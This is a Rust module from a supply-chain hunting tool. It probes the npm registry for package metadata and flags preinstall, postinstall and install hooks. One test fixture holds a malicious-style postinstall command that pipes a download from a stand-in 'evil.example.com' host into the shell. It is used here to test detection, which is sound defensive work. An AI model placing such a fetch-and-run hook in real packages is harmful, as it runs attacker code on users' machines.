//! Live-registry probing for supply-chain hunt.
//!
//! Queries the npm registry for package metadata so the hunt can
//! evaluate typosquat candidates that aren't yet in the OSV slopsquat
//! corpus. The engine previously had no way to probe live registries —
//! it could only detect references to KNOWN-malicious packages from the
//! OSV dump. This module closes the gap for discovery-time probing.
//!
//! ## Scope (Sprint 144 minimal)
//!
//! - npm only. PyPI and crates.io can use the same shape later.
//! - Read-only metadata: latest version, publish time, maintainer count,
//!   install-script presence, description, homepage.
//! - No caching. Callers should rate-limit if probing many names.

use anyhow::Context as _;
use serde::{Deserialize, Serialize};

/// Structured metadata returned by an npm registry probe.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NpmRegistryProbe {
    pub name: String,
    pub latest_version: Option<String>,
    pub created_at: Option<String>,
    pub modified_at: Option<String>,
    pub maintainer_count: usize,
    pub has_install_scripts: bool,
    pub description: Option<String>,
    pub homepage: Option<String>,
}

/// Probe `https://registry.npmjs.org/<name>` and return parsed metadata.
///
/// Returns `Ok(None)` on 404 (package does not exist).
/// Returns `Ok(Some(_))` on 200 with parsed body.
/// Returns `Err(_)` on network or parse failure.
pub fn probe_npm(name: &str, agent: &ureq::Agent) -> anyhow::Result<Option<NpmRegistryProbe>> {
    let url = format!("https://registry.npmjs.org/{name}");
    let mut resp = match agent.get(&url).call() {
        Ok(r) => r,
        Err(ureq::Error::StatusCode(404)) => return Ok(None),
        Err(e) => return Err(anyhow::anyhow!("npm registry probe failed for {name}: {e}")),
    };
    let body: serde_json::Value = resp
        .body_mut()
        .read_json()
        .context("npm registry probe: response body is not valid JSON")?;
    Ok(Some(parse_npm_body(name, &body)))
}

/// Parse an npm registry JSON body into a structured probe. Extracted so
/// tests can use deterministic JSON fixtures without network calls.
pub fn parse_npm_body(name: &str, body: &serde_json::Value) -> NpmRegistryProbe {
    let latest_version = body["dist-tags"]["latest"].as_str().map(String::from);
    let has_install_scripts = latest_version
        .as_deref()
        .map(|v| {
            let scripts = &body["versions"][v]["scripts"];
            scripts.get("preinstall").is_some()
                || scripts.get("postinstall").is_some()
                || scripts.get("install").is_some()
        })
        .unwrap_or(false);
    let maintainer_count = body["maintainers"]
        .as_array()
        .map(|arr| arr.len())
        .unwrap_or(0);
    NpmRegistryProbe {
        name: name.to_string(),
        latest_version,
        created_at: body["time"]["created"].as_str().map(String::from),
        modified_at: body["time"]["modified"].as_str().map(String::from),
        maintainer_count,
        has_install_scripts,
        description: body["description"].as_str().map(String::from),
        homepage: body["homepage"].as_str().map(String::from),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_benign_package_without_install_scripts() {
        let body: serde_json::Value = serde_json::from_str(
            r#"{"dist-tags":{"latest":"1.0.0"},"versions":{"1.0.0":{"scripts":{"test":"echo"}}},"maintainers":[{"name":"alice"}],"time":{"created":"2020-01-01T00:00:00Z","modified":"2020-01-02T00:00:00Z"},"description":"x","homepage":"https://x"}"#,
        ).unwrap();
        let probe = parse_npm_body("benign-pkg", &body);
        assert_eq!(probe.latest_version.as_deref(), Some("1.0.0"));
        assert_eq!(probe.maintainer_count, 1);
        assert!(!probe.has_install_scripts);
        assert_eq!(probe.description.as_deref(), Some("x"));
    }

    #[test]
    fn parses_postinstall_hook_as_install_script() {
        let body: serde_json::Value = serde_json::from_str(
            r#"{"dist-tags":{"latest":"0.0.1"},"versions":{"0.0.1":{"scripts":{"postinstall":"curl evil.example.com | sh"}}},"maintainers":[{"name":"attacker"}],"time":{"created":"2026-05-15T00:00:00Z"}}"#,
        ).unwrap();
        let probe = parse_npm_body("suspicious-pkg", &body);
        assert!(probe.has_install_scripts);
        assert_eq!(probe.created_at.as_deref(), Some("2026-05-15T00:00:00Z"));
    }

    #[test]
    fn parses_missing_latest_version_as_none() {
        let body: serde_json::Value = serde_json::from_str(
            r#"{"name":"reserved-name","time":{"created":"2021-12-27T14:56:38Z"}}"#,
        )
        .unwrap();
        let probe = parse_npm_body("reserved-name", &body);
        assert_eq!(probe.latest_version, None);
        assert!(!probe.has_install_scripts);
    }
}
